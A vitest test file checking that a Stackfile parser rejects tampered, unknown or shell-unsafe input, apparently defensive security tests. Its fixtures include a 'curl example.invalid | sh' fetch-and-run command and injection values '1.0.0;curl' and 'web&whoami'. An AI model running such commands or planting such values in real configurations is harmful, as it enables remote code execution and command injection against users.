import { describe, expect, it } from 'vitest'
import { formatStackJson } from '../src/export.js'
import { parseStackJson } from '../src/validation.js'
import { makeStack } from './fixtures.js'

describe('Stackfile validation', () => {
  it('round-trips an integrity-sealed Stackfile', () => {
    const stack = makeStack()
    expect(parseStackJson(formatStackJson(stack))).toEqual(stack)
  })

  it('rejects modifications after sealing', () => {
    const stack = makeStack()
    const tampered = { ...stack, name: 'Tampered' }
    expect(() => parseStackJson(JSON.stringify(tampered))).toThrow(/integrity check failed/i)
  })

  it('rejects unknown fields instead of silently accepting them', () => {
    const stack = makeStack()
    const unknown = { ...stack, execute: 'curl example.invalid | sh' }
    expect(() => parseStackJson(JSON.stringify(unknown))).toThrow(/unsupported field/i)
  })

  it('rejects dependency specifiers that could become shell syntax', () => {
    const stack = makeStack({ bundles: [
      { name: '@deepseek-ai/dsh-base', sourceKind: 'builtin' },
      { name: 'dsh-danger', sourceKind: 'registry', specifier: '1.0.0;curl', installedVersion: '1.0.0' },
    ] })
    expect(() => parseStackJson(JSON.stringify(stack))).toThrow(/unsafe shell characters/i)
  })

  it('rejects profile names that could become shell syntax on Windows', () => {
    const stack = makeStack()
    const unsafe = { ...stack, source: { ...stack.source, profile: 'web&whoami' } }
    expect(() => parseStackJson(JSON.stringify(unsafe))).toThrow(/invalid profile name/i)
  })
})
